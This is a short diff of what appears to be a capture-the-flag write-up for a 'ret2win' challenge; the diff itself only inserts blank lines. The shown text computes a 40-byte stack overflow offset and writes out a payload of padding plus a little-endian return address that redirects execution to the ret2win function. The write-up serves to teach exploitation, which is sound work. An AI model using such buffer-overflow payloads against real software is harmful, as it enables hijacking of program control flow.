@@ -49,7 +49,9 @@ gdb$ disas ret2win
 ...
 ```
 The address of the syscall is 0x0000000000400764.
+
 Overflow length will be 32 bytes(buffer) + 8 bytes (RBP) = 40 bytes.
+
 Therefore, the overflow strings will be:
 ```
 A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'
